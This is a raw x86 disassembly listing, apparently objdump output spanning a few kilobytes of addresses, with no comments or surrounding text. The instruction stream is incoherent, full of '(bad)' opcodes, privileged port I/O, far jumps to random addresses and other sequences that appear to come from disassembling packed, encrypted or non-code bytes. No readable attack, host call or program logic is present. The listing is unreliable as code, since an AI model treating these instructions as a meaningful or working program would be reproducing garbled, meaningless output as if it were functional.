  420504:	adc    bl,BYTE PTR [edx+eax*1-0x5c]
  420508:	mov    BYTE PTR [esi],bl
  42050a:	and    bl,BYTE PTR [ecx]
  42050c:	pop    ecx
  42050d:	ins    DWORD PTR es:[edi],dx
  42050e:	loope  0x420563
  420510:	pop    esp
  420511:	sbb    esi,ebx
  420513:	rcl    DWORD PTR [ebx-0x69],cl
  420516:	fwait
  420517:	mov    ds:0xa6c6a2e6,eax
  42051c:	sub    al,0x4a
  42051e:	shr    BYTE PTR [ecx+0x49a1172e],0xe6
  420525:	or     ch,bl
  420527:	xor    ecx,DWORD PTR [ecx+0x48]
  42052a:	xchg   esp,eax
  42052b:	jno    0x4204c5
  42052d:	xor    edx,0xffffffe7
  420530:	xchg   edi,eax
  420531:	hlt    
  420532:	cmp    BYTE PTR [esi],bl
  420534:	mov    edx,esi
  420536:	test   BYTE PTR [ecx],0xeb
  420539:	and    edx,DWORD PTR [ecx-0x3e]
  42053c:	iret   
  42053d:	sbb    BYTE PTR [edi+0x63],0xc0
  420541:	xchg   edx,eax
  420542:	dec    esp
  420543:	xor    ebp,DWORD PTR [ebx+eax*4]
  420546:	inc    eax
  420547:	add    BYTE PTR [ecx-0x7c0a945a],dh
  42054d:	jmp    0x984402be
  420552:	add    DWORD PTR [edx+0x26],ebx
  420555:	aaa    
  420556:	mov    ebp,DWORD PTR [esi+0x260f9d01]
  42055c:	loop   0x420560
  42055e:	iret   
  42055f:	jns    0x4204e8
  420561:	sahf   
  420562:	jl     0x4204ec
  420564:	idiv   bh
  420566:	sub    dl,BYTE PTR [esi-0x34606f57]
  42056c:	scas   al,BYTE PTR es:[edi]
  42056d:	mov    eax,ds:0xe5ea5aaf
  420572:	push   es
  420573:	jbe    0x420566
  420575:	xor    esp,edi
  420577:	push   0xffffffc3
  420579:	pop    esp
  42057a:	pop    ds
  42057b:	jae    0x4205fa
  42057d:	pop    edx
  42057e:	imul   eax,esi,0xfe3d0538
  420584:	aaa    
  420585:	jae    0x4205db
  420587:	mov    ecx,0xdb7ff9f2
  42058c:	inc    ebx
  42058d:	adc    edi,0xfffffff9
  420590:	dec    ecx
  420591:	aas    
  420592:	enter  0xe589,0xb3
  420596:	imul   esp,DWORD PTR [edi],0x16f3a2f5
  42059c:	xchg   edx,eax
  42059d:	bound  edi,QWORD PTR [ebx]
  42059f:	fdivr  st,st(7)
  4205a1:	jae    0x420578
  4205a3:	mov    ch,bh
  4205a5:	into   
  4205a6:	mov    WORD PTR [esi],fs
  4205a8:	push   edx
  4205a9:	dec    edi
  4205aa:	xchg   edi,eax
  4205ab:	or     edx,DWORD PTR [edi]
  4205ad:	aas    
  4205ae:	test   bl,0xb1
  4205b1:	outs   dx,DWORD PTR ds:[esi]
  4205b2:	push   ecx
  4205b3:	(bad)  
  4205b5:	or     BYTE PTR [ebp-0x33],0x18
  4205b9:	jg     0x420566
  4205bb:	fbstp  TBYTE PTR [eax+ecx*8+0x17]
  4205bf:	arpl   WORD PTR [esp+ecx*1-0x23bcbaae],si
  4205c6:	push   ds
  4205c7:	into   
  4205c8:	fcom   QWORD PTR [ebx+0x14]
  4205cb:	xor    eax,0xfb4cd320
  4205d0:	iret   
  4205d1:	mov    ds,WORD PTR [edx-0x42886235]
  4205d7:	and    edi,DWORD PTR [edi-0x2ff0c60c]
  4205dd:	dec    ebp
  4205de:	xlat   BYTE PTR ds:[ebx]
  4205df:	bound  ebp,QWORD PTR [ecx+0x775aa0f1]
  4205e5:	inc    ebx
  4205e6:	loop   0x4205ce
  4205e8:	lds    ecx,FWORD PTR [ebx+ecx*2]
  4205eb:	xor    ch,dh
  4205ed:	shl    DWORD PTR [edi-0x12534b60],0xf0
  4205f4:	xor    BYTE PTR [eax-0x63],dl
  4205f7:	jbe    0xe8004b2
  4205fd:	inc    ebp
  4205fe:	lea    edx,[ecx+0x7d83cbcb]
  420604:	pop    ds
  420605:	jne    0x420625
  420607:	popa   
  420608:	sbb    BYTE PTR [edx+0x3d],dl
  42060b:	sbb    BYTE PTR [ebx],dh
  42060d:	xchg   edi,eax
  42060e:	scas   al,BYTE PTR es:[edi]
  42060f:	stos   DWORD PTR es:[edi],eax
  420610:	sbb    ch,BYTE PTR [ebx+0x57bbd015]
  420616:	test   DWORD PTR [ebx+0xf808214],ebx
  42061c:	mov    DWORD PTR [ebx],edi
  42061e:	jb     0x42066d
  420620:	jle    0x4205f7
  420622:	fsubp  st(6),st
  420624:	aad    0x6c
  420626:	xor    eax,0x561dd3b8
  42062b:	outs   dx,BYTE PTR ds:[esi]
  42062c:	aam    0xba
  42062e:	retf   0xfdca
  420631:	cmp    eax,0x326526e
  420636:	pop    ebp
  420637:	stc    
  420638:	cmc    
  420639:	call   0xaa42e352
  42063e:	jl     0x4205d5
  420640:	pop    ebx
  420641:	sbb    ebx,ebp
  420643:	sub    eax,DWORD PTR [edi]
  420645:	mov    al,0x19
  420647:	pop    ebp
  420648:	adc    ebp,DWORD PTR ds:0xac019350
  42064e:	leave  
  42064f:	rol    DWORD PTR ds:0x67f6335a,0x33
  420656:	push   eax
  420657:	pop    ecx
  420658:	mov    eax,ds:0x66f416e2
  42065d:	push   eax
  42065e:	mov    cs,edi
  420660:	pop    ebp
  420661:	outs   dx,DWORD PTR ds:[esi]
  420662:	mov    ds:0x4c4cf678,eax
  420667:	ficom  DWORD PTR es:[esi+0xd5402f1]
  42066e:	push   ebx
  42066f:	bound  ebp,QWORD PTR [esi]
  420671:	ret    
  420672:	pmuludq mm5,QWORD PTR [ecx+0x13]
  420676:	jbe    0x4205fe
  420678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420679:	(bad)  
  42067a:	fwait
  42067b:	mov    ah,BYTE PTR [ebx-0x65]
  42067e:	xchg   edi,eax
  42067f:	aad    0x88
  420681:	cmp    BYTE PTR [ebx-0x12],al
  420684:	add    ebp,DWORD PTR [ebp-0x788beabe]
  42068a:	sbb    eax,0x6fb206dd
  42068f:	mov    al,ds:0x6f749f90
  420694:	pushf  
  420695:	push   ss
  420696:	lahf   
  420697:	dec    edi
  420698:	dec    edi
  420699:	adc    eax,0xbadc0427
  42069e:	mov    ebx,cs
  4206a0:	mov    eax,ds:0xd542c25b
  4206a5:	das    
  4206a6:	ror    bl,cl
  4206a8:	dec    esp
  4206a9:	mov    ds:0xc4a7866f,al
  4206ae:	mov    WORD PTR [ecx+esi*8-0x5c00258a],es
  4206b5:	or     dl,BYTE PTR [edi+ebx*8]
  4206b8:	jbe    0x4206fe
  4206ba:	popa   
  4206bb:	or     al,0x37
  4206bd:	or     eax,0x8c3e588b
  4206c2:	and    ebx,DWORD PTR [edi+edi*4-0x6b]
  4206c6:	mov    ebp,0x16420c29
  4206cb:	mov    bh,ch
  4206cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206ce:	cld    
  4206cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206d0:	inc    edi
  4206d1:	lods   eax,DWORD PTR ds:[esi]
  4206d2:	cli    
  4206d3:	and    al,bl
  4206d5:	and    al,0x46
  4206d7:	push   cs
  4206d8:	adc    esi,esp
  4206da:	ret    
  4206db:	inc    edi
  4206dc:	xchg   BYTE PTR [edx+0x40],al
  4206df:	pop    ebp
  4206e0:	test   al,0x96
  4206e2:	jge    0x42067e
  4206e4:	sahf   
  4206e5:	(bad)  
  4206e6:	jl     0x420729
  4206e8:	mov    esp,0x9cde9015
  4206ed:	jne    0x420717
  4206ef:	cmp    DWORD PTR [eax-0x4785562b],eax
  4206f5:	lea    esi,[ebx]
  4206f7:	push   0x370bc553
  4206fc:	ds fwait
  4206fe:	sbb    esi,ebp
  420700:	ins    DWORD PTR es:[edi],dx
  420701:	in     eax,0x8a
  420703:	dec    edx
  420704:	mov    esp,0xfdaa79ee
  420709:	mov    dl,0xdb
  42070b:	pop    es
  42070c:	adc    dl,BYTE PTR [edx+0x4f]
  42070f:	leave  
  420710:	loope  0x420771
  420712:	xchg   edx,eax
  420713:	xchg   edi,eax
  420714:	xchg   ecx,eax
  420715:	push   eax
  420716:	in     eax,dx
  420717:	inc    eax
  420718:	inc    ebx
  420719:	fldenv [edi+ebp*4+0x38]
  42071d:	adc    al,0xfe
  42071f:	retf   0xe8ce
  420722:	sbb    al,0xb7
  420724:	jbe    0x4206f2
  420726:	push   DWORD PTR [ebx]
  420728:	or     eax,0xa3eea8cb
  42072d:	retf   0xa9b3
  420730:	inc    bx
  420732:	cwde   
  420733:	test   al,0xbf
  420735:	pop    ecx
  420736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420737:	lahf   
  420738:	jmp    0x4207a2
  42073a:	in     eax,dx
  42073b:	cmp    eax,0x105b5ba6
  420740:	outs   dx,BYTE PTR ds:[esi]
  420741:	clc    
  420742:	int3   
  420743:	nop
  420744:	jmp    0xfbfd558e
  420749:	mov    edx,0x8ec231ac
  42074e:	inc    eax
  42074f:	jecxz  0x42074c
  420751:	xor    eax,0xa7e414d2
  420756:	test   eax,0x531d4dc2
  42075b:	inc    ebp
  42075c:	outs   dx,BYTE PTR ds:[esi]
  42075d:	dec    BYTE PTR [ecx+ecx*2]
  420760:	inc    edi
  420761:	sub    ebx,DWORD PTR [ecx]
  420763:	lock jne 0x420711
  420766:	fnop   
  420768:	xchg   ebx,eax
  420769:	test   BYTE PTR [ebx+0x608d9631],ch
  42076f:	xor    DWORD PTR [edi+eiz*8+0x6b9970c0],eax
  420776:	mov    ecx,0x17c7a80d
  42077b:	ds ret 
  42077d:	adc    ecx,eax
  42077f:	mov    ch,0xeb
  420781:	(bad)  
  420782:	xor    eax,0x4a67bd6b
  420787:	xchg   ebp,eax
  420788:	jo     0x4207e7
  42078a:	pop    ebx
  42078b:	hlt    
  42078c:	int    0x71
  42078e:	loopne 0x4207d2
  420790:	xor    esi,DWORD PTR [ebx+0x4cd5f227]
  420796:	arpl   WORD PTR [eax+edi*1],cx
  420799:	adc    BYTE PTR [ebx],cl
  42079b:	fidivr DWORD PTR [esp+esi*8+0x2108d681]
  4207a2:	inc    eax
  4207a3:	int3   
  4207a4:	data16 js 0x4207d1
  4207a7:	dec    esp
  4207a8:	addr16 adc ah,al
  4207ab:	mov    al,ds:0x35c98dbb
  4207b0:	push   eax
  4207b1:	(bad)
  4207b5:	and    BYTE PTR [ebx+edx*8-0x1f],bh
  4207b9:	scas   al,BYTE PTR es:[edi]
  4207ba:	aam    0x18
  4207bc:	and    ecx,edi
  4207be:	cmp    BYTE PTR [ebx-0xa43387b],0x2c
  4207c5:	popf   
  4207c6:	and    BYTE PTR [edi],bl
  4207c8:	xor    DWORD PTR [ecx],eax
  4207ca:	dec    esi
  4207cb:	jnp    0x420820
  4207cd:	xor    dh,BYTE PTR [eax-0x73933677]
  4207d3:	shl    DWORD PTR [ebx+0x2b],cl
  4207d6:	inc    ebx
  4207d7:	sub    ah,BYTE PTR ds:0x7326bc8
  4207dd:	in     al,0xbc
  4207df:	sbb    dl,bh
  4207e1:	mov    edi,0xa30cd9aa
  4207e6:	push   edx
  4207e7:	lea    edx,[edx]
  4207e9:	rol    edi,0x9
  4207ec:	imul   ecx,DWORD PTR [ebp+0x6a2cc987],0x5ea20d8f
  4207f6:	add    eax,0xc6107f0
  4207fb:	xchg   esp,eax
  4207fc:	and    bl,dh
  4207fe:	adc    eax,0xa5ff693d
  420804:	push   0x7e3ea783
  420809:	ret    
  42080a:	mov    bl,0x82
  42080c:	mov    bh,BYTE PTR [edx]
  42080e:	jno    0x42088b
  420810:	mov    DWORD PTR [esi+0x6277ac3],ebx
  420816:	in     al,dx
  420817:	daa    
  420818:	mov    ebp,0x93da03d3
  42081d:	jp     0x42083a
  42081f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420820:	jmp    FWORD PTR [esp+edi*2-0x7bb33f41]
  420827:	add    DWORD PTR [ebp+0x2f06a063],edx
  42082d:	(bad)  
  42082e:	mov    cl,0xd0
  420830:	jmp    DWORD PTR [ecx-0x78]
  420833:	add    BYTE PTR [edi+0x4e21c41d],ah
  420839:	das    
  42083a:	pop    edx
  42083b:	sahf   
  42083c:	in     eax,0x46
  42083e:	fild   WORD PTR [ecx-0x64]
  420841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420842:	push   esp
  420843:	jmp    0xc4ab6bf4
  420848:	push   ss
  420849:	jo     0x420861
  42084b:	dec    ecx
  42084c:	sar    BYTE PTR [edi-0x22ec5d59],0x4f
  420853:	retf   
  420854:	jge    0x42088a
  420856:	and    BYTE PTR [ebx+0x4d],al
  420859:	cmp    DWORD PTR [eax+0x704016f7],ecx
  42085f:	mov    al,ds:0xfe440231
  420864:	out    0x35,eax
  420866:	mov    bh,0x9c
  420868:	inc    ecx
  420869:	mov    ds:0xf13ac58e,al
  42086e:	mov    eax,ds:0x49d5b955
  420873:	repz push edx
  420875:	pop    edx
  420876:	nop
  420877:	cdq    
  420878:	xchg   esp,eax
  420879:	mov    ch,0x32
  42087b:	dec    edi
  42087c:	(bad)  
  42087d:	(bad)  
  42087e:	mov    esi,0xc496f0a4
  420883:	add    ah,BYTE PTR [edi-0xae8c936]
  420889:	sbb    BYTE PTR [edx],cl
  42088b:	or     al,BYTE PTR [edx+eax*4+0x6e]
  42088f:	or     eax,0xe58a084a
  420894:	dec    ebp
  420895:	cwde   
  420896:	in     al,dx
  420897:	mov    ch,0x6d
  420899:	xchg   ebp,eax
  42089a:	adc    ch,BYTE PTR ss:[ebp-0x3ff8b14a]
  4208a1:	xchg   ebx,eax
  4208a2:	test   DWORD PTR [eax],0xa222d37d
  4208a8:	ret    0x6fc7
  4208ab:	jmp    0xc9fd36a3
  4208b0:	repz inc esp
  4208b2:	mov    bh,0x78
  4208b4:	or     eax,0xed635a75
  4208b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208ba:	pop    edx
  4208bb:	mov    esi,0x1716d93f
  4208c0:	sbb    BYTE PTR [edx+ecx*1+0x7a],cl
  4208c4:	push   ebx
  4208c5:	js     0x420887
  4208c7:	fidivr WORD PTR [ebx]
  4208c9:	lds    ebp,FWORD PTR [ebp+0x25]
  4208cc:	ret    0x58db
  4208cf:	cs inc eax
  4208d1:	test   DWORD PTR [edi],ebp
  4208d3:	jmp    DWORD PTR [esi+0xca0e3b7]
  4208d9:	xor    BYTE PTR [ebp+0x3e],ch
  4208dc:	daa    
  4208dd:	sar    BYTE PTR [ecx+0x51],0x41
  4208e1:	nop
  4208e2:	leave  
  4208e3:	adc    ch,BYTE PTR [edi-0x3d12e59f]
  4208e9:	add    bh,0xd1
  4208ec:	jae    0x4208fc
  4208ee:	repnz cmp bh,BYTE PTR ds:0xb0bc9ea1
  4208f5:	sbb    BYTE PTR [esi],bl
  4208f7:	jbe    0x420953
  4208f9:	dec    ah
  4208fb:	or     al,0x50
  4208fd:	(bad)  
  4208fe:	shr    DWORD PTR [ebx+edx*1+0x75],cl
  420902:	or     DWORD PTR [eax],ebp
  420904:	jmp    0x1ba971c9
  420909:	add    ch,BYTE PTR [edi-0x494a7b40]
  42090f:	or     BYTE PTR [esi+0x57],ah
  420912:	add    eax,0xa98a482e
  420917:	(bad)  
  420919:	mov    ds:0xade17f05,eax
  42091e:	xor    DWORD PTR [ebx-0x209c8b1b],ebx
  420924:	(bad)  
  420925:	repz (bad) 
  420927:	(bad)  [edi-0x5b841436]
  42092d:	int3   
  42092e:	popa   
  42092f:	lock xchg DWORD PTR [ebx],eax
  420932:	sbb    BYTE PTR [edx+0x2143280e],bl
  420938:	hlt    
  420939:	inc    ecx
  42093a:	aad    0x12
  42093c:	fidiv  WORD PTR [edi+0x30fecbea]
  420942:	cmp    edx,DWORD PTR [eax-0x3b]
  420945:	mov    esi,ebp
  420947:	sbb    ch,BYTE PTR [ebp-0x5b]
  42094a:	cmp    dl,BYTE PTR [ebp-0x744b7547]
  420950:	ja     0x4209a7
  420952:	gs je  0x42098c
  420955:	outs   dx,BYTE PTR ds:[esi]
  420956:	fisub  DWORD PTR [eax-0x7c05614c]
  42095c:	pusha  
  42095d:	into   
  42095e:	cmp    BYTE PTR [edx-0x66a6ed5e],dl
  420964:	jmp    0xf45:0x902ba94c
  42096b:	cdq    
  42096c:	(bad)  
  42096d:	ret    0xba0f
  420970:	dec    edx
  420971:	ss ret 0x35d6
  420975:	(bad)  
  420976:	ss inc ecx
  420978:	push   ebp
  420979:	jno    0x4209aa
  42097b:	in     al,0x5e
  42097d:	cmc    
  42097e:	xchg   ebp,eax
  42097f:	adc    BYTE PTR [ebp-0x45],0xaf
  420983:	mov    dl,0x95
  420985:	xor    DWORD PTR [edi],ebx
  420987:	(bad)  
  420988:	(bad)  
  420989:	call   0x9a7b:0x57cf3866
  420990:	inc    edx
  420991:	pop    ss
  420992:	push   0x7800598b
  420997:	ins    BYTE PTR es:[edi],dx
  420998:	jle    0x42094d
  42099a:	int3   
  42099b:	pusha  
  42099c:	mov    ebp,0x270d404c
  4209a1:	push   ss
  4209a2:	push   eax
  4209a3:	loop   0x4209fc
  4209a5:	mov    dh,0x4e
  4209a7:	push   0xc96dbe68
  4209ac:	mov    ecx,0xf77e88cf
  4209b1:	int    0x86
  4209b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209b4:	mov    ah,BYTE PTR [ebp-0x53be255b]
  4209ba:	mov    es,WORD PTR [eax-0x79]
  4209bd:	mov    bl,0x6c
  4209bf:	aas    
  4209c0:	push   esp
  4209c1:	movhps QWORD PTR [esi],xmm0
  4209c4:	pop    es
  4209c5:	mov    ecx,0xee4b1f16
  4209ca:	ins    BYTE PTR es:[edi],dx
  4209cb:	hlt    
  4209cc:	inc    esi
  4209cd:	cmp    al,0xd5
  4209cf:	lods   eax,DWORD PTR ds:[esi]
  4209d0:	jp     0x4209ee
  4209d2:	adc    al,0x68
  4209d4:	stos   DWORD PTR es:[edi],eax
  4209d5:	cmp    al,ah
  4209d7:	push   esp
  4209d8:	inc    eax
  4209d9:	(bad)  
  4209da:	adc    ch,cl
  4209dc:	cli    
  4209dd:	sahf   
  4209de:	mov    ah,0x23
  4209e0:	scas   eax,DWORD PTR es:[edi]
  4209e1:	inc    esp
  4209e2:	scas   eax,DWORD PTR es:[edi]
  4209e3:	je     0x4209b6
  4209e5:	jne    0x420a46
  4209e7:	sub    DWORD PTR [ecx],0x2d
  4209ea:	adc    ebx,DWORD PTR ss:[eax-0x7e7dc1ab]
  4209f1:	jl     0x420a6b
  4209f3:	and    eax,edx
  4209f5:	push   0xffffff80
  4209f7:	mov    ebx,0x8c398678
  4209fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209fd:	stos   BYTE PTR es:[edi],al
  4209fe:	retf   0xa1fe
  420a01:	mov    al,ds:0xdecc97cd
  420a06:	mov    edx,0xf59d6fe3
  420a0b:	sbb    BYTE PTR [ecx-0x626e3caa],al
  420a11:	popf   
  420a12:	inc    edx
  420a13:	out    0xf3,eax
  420a15:	int3   
  420a16:	test   al,0xe4
  420a18:	pop    ecx
  420a19:	pop    eax
  420a1a:	pop    ss
  420a1b:	leave  
  420a1c:	xor    BYTE PTR [eax-0x6d59872b],cl
  420a22:	lds    edi,FWORD PTR [ecx-0x43dc5e5c]
  420a28:	loop   0x420a5c
  420a2a:	enter  0x8673,0x24
  420a2e:	icebp  
  420a2f:	cmp    eax,0x982027e3
  420a34:	ret    0x9581
  420a37:	mov    dh,0x4e
  420a39:	sub    al,al
  420a3b:	repz sbb ecx,edi
  420a3e:	test   al,0x73
  420a40:	add    al,0x1e
  420a42:	xor    esi,esi
  420a44:	in     al,dx
  420a45:	mov    esp,0x9a087775
  420a4a:	pushf  
  420a4b:	adc    DWORD PTR [ebx-0xf],esi
  420a4e:	dec    eax
  420a4f:	cmp    DWORD PTR [eax-0x504a6d48],esp
  420a55:	es repz sbb esi,ebx
  420a59:	mov    dl,0x67
  420a5b:	inc    ecx
  420a5c:	(bad)  
  420a5d:	mov    eax,ds:0xfbda69f2
  420a62:	mov    esi,0x99beeafb
  420a67:	shl    DWORD PTR [ebp-0x26],1
  420a6a:	ins    BYTE PTR es:[edi],dx
  420a6b:	mov    WORD PTR [ebx-0x565031ba],gs
  420a71:	sub    esp,DWORD PTR [edi]
  420a73:	mov    cl,0x71
  420a75:	out    0x13,eax
  420a77:	adc    bh,BYTE PTR [ebp+0x65]
  420a7a:	not    DWORD PTR [edi-0x6c90f3de]
  420a80:	call   0x8cbb:0x6b99494f
  420a87:	loopne 0x420a66
  420a89:	into   
  420a8a:	out    dx,eax
  420a8b:	sbb    DWORD PTR [eax+edx*1-0x7091c592],ebp
  420a92:	or     esi,eax
  420a94:	bound  edi,QWORD PTR [eax+edx*8+0x4faeb8e0]
  420a9b:	inc    ecx
  420a9c:	fcomip st,st(1)
  420a9e:	mov    BYTE PTR [ecx+ecx*4+0x39],dl
  420aa2:	mov    DWORD PTR [eax],edx
  420aa4:	pushf  
  420aa5:	adc    eax,0x339722ec
  420aaa:	push   ds
  420aab:	inc    ebx
  420aac:	mov    edi,0xcbbf5434
  420ab1:	ss pop es
  420ab3:	(bad)  
  420ab4:	addr16 mov ebp,0xb334b9e
  420aba:	sub    DWORD PTR [esi],edi
  420abc:	repnz sbb edi,esp
  420abf:	(bad)  
  420ac0:	fidiv  DWORD PTR [ebp-0x43bfaa9f]
  420ac6:	inc    ecx
  420ac7:	dec    ebp
  420ac8:	sbb    esp,DWORD PTR [eax]
  420aca:	test   WORD PTR [eax-0x2422a80a],ax
  420ad1:	mov    edi,0x57095326
  420ad6:	sub    bh,dh
  420ad8:	pop    es
  420ad9:	into   
  420ada:	and    BYTE PTR [ebx+0x7a],bl
  420add:	lods   al,BYTE PTR ds:[esi]
  420ade:	enter  0x4894,0xa0
  420ae2:	retf   0xf923
  420ae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ae6:	mov    dl,BYTE PTR [esi]
  420ae8:	in     eax,dx
  420ae9:	lea    esp,[esp+eax*8+0x74521e23]
  420af0:	and    BYTE PTR [ecx-0x1a106338],dl
  420af6:	mov    esp,0xbaa9f34
  420afb:	lock cmp ah,bh
  420afe:	jmp    0xf186:0x1f730b7d
  420b05:	adc    bl,BYTE PTR [eax+0x56306140]
  420b0b:	add    BYTE PTR [esi-0x2b],ah
  420b0e:	inc    esi
  420b0f:	dec    edi
  420b10:	jb     0x420a9c
  420b12:	test   BYTE PTR [edi+0x2f],ah
  420b15:	popf   
  420b16:	pusha  
  420b17:	push   ss
  420b18:	mov    ah,0xd2
  420b1a:	pop    ebp
  420b1b:	sub    ebx,ebp
  420b1d:	out    dx,eax
  420b1e:	ins    DWORD PTR es:[edi],dx
  420b1f:	push   cs
  420b20:	xchg   edx,eax
  420b21:	mov    ds:0x525c3ba5,eax
  420b26:	in     al,dx
  420b27:	in     eax,0x2c
  420b29:	aam    0x5c
  420b2b:	mov    cl,0xf6
  420b2d:	inc    ecx
  420b2e:	out    dx,al
  420b2f:	xor    eax,0xf909ae8d
  420b34:	or     bl,BYTE PTR [eax]
  420b36:	addr16 out dx,al
  420b38:	adc    eax,0xbf1fdcaa
  420b3d:	adc    bh,ch
  420b3f:	shr    BYTE PTR [eax],0x6f
  420b42:	pop    eax
  420b43:	pop    ebx
  420b44:	outs   dx,DWORD PTR ds:[esi]
  420b45:	cmp    dl,BYTE PTR [ebp-0x54df0029]
  420b4b:	scas   al,BYTE PTR es:[edi]
  420b4c:	sub    dh,BYTE PTR [eax+0x5cc0cbd2]
  420b52:	mov    ds:0xb35ecea4,al
  420b57:	pop    es
  420b58:	inc    ecx
  420b59:	xchg   edx,eax
  420b5a:	daa    
  420b5b:	ffreep st(5)
  420b5d:	test   BYTE PTR [esi],bh
  420b5f:	jmp    FWORD PTR [edx]
  420b61:	sub    eax,0xef9724e
  420b66:	cmp    bh,0x97
  420b69:	test   DWORD PTR [edx],edi
  420b6b:	(bad)  
  420b6d:	rol    BYTE PTR [ebp-0x56],0x28
  420b71:	sbb    al,0x6c
  420b73:	rcr    DWORD PTR [eax+0x498f18b],0x2b
  420b7a:	cmp    ebp,DWORD PTR ds:0xf269bec0
  420b80:	dec    ecx
  420b81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b82:	imul   esi,ebp,0xfffffff0
  420b85:	jne    0x420b74
  420b87:	fmul   QWORD PTR [ebx+edx*8]
  420b8a:	mov    edx,0x7f95d33c
  420b8f:	dec    esp
  420b90:	adc    al,0xa7
  420b92:	js     0x420b38
  420b94:	add    DWORD PTR [eax+0x7ea9b0bb],0x352811f8
  420b9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b9f:	in     eax,0xf3
  420ba1:	dec    ebp
  420ba2:	cmp    al,0xc8
  420ba4:	retf   
  420ba5:	fst    QWORD PTR [edx+ebp*8]
  420ba8:	pop    esp
  420ba9:	loopne 0x420c04
  420bab:	xor    edi,0xcfc83f18
  420bb1:	out    dx,al
  420bb2:	pop    ss
  420bb3:	pop    eax
  420bb4:	sbb    eax,0xa7336368
  420bb9:	iret   
  420bba:	leave  
  420bbb:	sub    BYTE PTR [edx+ebx*1-0x5a],0xe1
  420bc0:	scas   al,BYTE PTR es:[edi]
  420bc1:	cld    
  420bc2:	sub    BYTE PTR [edx-0xb3a47e6],0xc4
  420bc9:	jnp    0x420b9f
  420bcb:	xchg   DWORD PTR [ebp-0x69],esp
  420bce:	mov    edi,DWORD PTR [edi-0x1e]
  420bd1:	loop   0x420c2c
  420bd3:	mov    bh,BYTE PTR [edx-0x54504924]
  420bd9:	into   
  420bda:	cli    
  420bdb:	out    0x43,al
  420bdd:	(bad)  
  420bde:	pop    ecx
  420bdf:	(bad)  
  420be0:	scas   al,BYTE PTR es:[edi]
  420be1:	stc    
  420be2:	or     eax,0x458a4580
  420be7:	jl     0x420bd6
  420be9:	in     eax,dx
  420bea:	cmp    al,0xb3
  420bec:	or     DWORD PTR [ecx+0x462fa7b6],ebx
  420bf2:	mov    bl,0xaf
  420bf4:	enter  0x4898,0xfa
  420bf8:	loop   0x420b9a
  420bfa:	mov    edx,esp
  420bfc:	clc    
  420bfd:	das    
  420bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bff:	sub    edi,esi
  420c01:	loope  0x420bb5
  420c03:	or     BYTE PTR [ecx-0x390da14d],bl
  420c09:	cmp    DWORD PTR [edx-0x53],ebp
  420c0c:	sub    edx,DWORD PTR [edi-0x37]
  420c0f:	cmp    dh,BYTE PTR [ebx]
  420c11:	in     eax,0x1f
  420c13:	retf   
  420c14:	mov    cl,0x75
  420c16:	fs (bad) 
  420c18:	jne    0x420c86
  420c1a:	cmp    al,0x73
  420c1c:	sub    ebp,DWORD PTR [esi]
  420c1e:	fnsave [esi+ebp*2+0x3c]
  420c22:	lods   al,BYTE PTR ds:[esi]
  420c23:	bound  ebp,QWORD PTR [edi]
  420c25:	mov    edx,0x20a27734
  420c2a:	mov    BYTE PTR [ecx-0xeb134f],bh
  420c30:	outs   dx,DWORD PTR ds:[esi]
  420c31:	and    al,0x6
  420c33:	mov    al,0x6f
  420c35:	mov    ebx,0x4acaea1e
  420c3a:	adc    DWORD PTR [esi+0x26],ebp
  420c3d:	and    eax,esi
  420c3f:	xor    bl,BYTE PTR [eax+esi*2+0x24]
  420c43:	and    al,dl
  420c45:	out    dx,eax
  420c46:	ja     0x420ca8
  420c48:	mov    ss,WORD PTR [ecx]
  420c4a:	mov    bl,0x18
  420c4c:	lock xlat BYTE PTR ds:[ebx]
  420c4e:	pop    esi
  420c4f:	jecxz  0x420c12
  420c51:	sub    eax,0x81b7441e
  420c56:	jge    0x420c3a
  420c58:	dec    edi
  420c59:	retf   0x32ee
  420c5c:	je     0x420cca
  420c5e:	pop    edi
  420c5f:	inc    edi
  420c60:	push   0x3925327c
  420c65:	xor    DWORD PTR [ecx],0x8
  420c68:	mov    al,ds:0xfa6151f1
  420c6d:	(bad)  [edi-0x4f]
  420c70:	mov    eax,0x8c228884
  420c75:	inc    ecx
  420c76:	mov    al,ds:0xce0c0ca9
  420c7b:	mov    eax,ds:0xd1c30383
  420c80:	mov    esp,0x2b6ac6af
  420c85:	in     al,0x2a
  420c87:	cmp    edx,ecx
  420c89:	jb     0x420c1d
  420c8b:	rcl    BYTE PTR [ebx],cl
  420c8d:	mov    eax,0xd455210f
  420c92:	dec    esp
  420c93:	sti    
  420c94:	pop    esp
  420c95:	(bad)  
  420c96:	and    cl,BYTE PTR [edx]
  420c98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c99:	aam    0xc2
  420c9b:	or     esi,edx
  420c9d:	jns    0x420c43
  420c9f:	pop    eax
  420ca0:	shl    BYTE PTR [eax],0xaf
  420ca3:	sti    
  420ca4:	cwde   
  420ca5:	jmp    0xaf2:0xb79939c6
  420cac:	enter  0x52a3,0xea
  420cb0:	xor    BYTE PTR [esi+0x53],ah
  420cb3:	sub    al,0xa8
  420cb5:	jle    0x420c7b
  420cb7:	idiv   dh
  420cb9:	or     al,0xae
  420cbb:	mov    eax,ds:0x1efecb6c
  420cc0:	add    dh,dh
  420cc2:	inc    esi
  420cc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cc4:	clc    
  420cc5:	outs   dx,DWORD PTR ds:[esi]
  420cc6:	push   ds
  420cc7:	adc    DWORD PTR [ebx],ebx
  420cc9:	lods   eax,DWORD PTR ds:[esi]
  420cca:	fstp   TBYTE PTR [ebx+0x79]
  420ccd:	adc    DWORD PTR [ecx],esp
  420ccf:	jecxz  0x420cd6
  420cd1:	out    dx,al
  420cd2:	or     eax,0x788cf126
  420cd7:	mov    edi,0x6043e746
  420cdc:	je     0x420d4e
  420cde:	push   eax
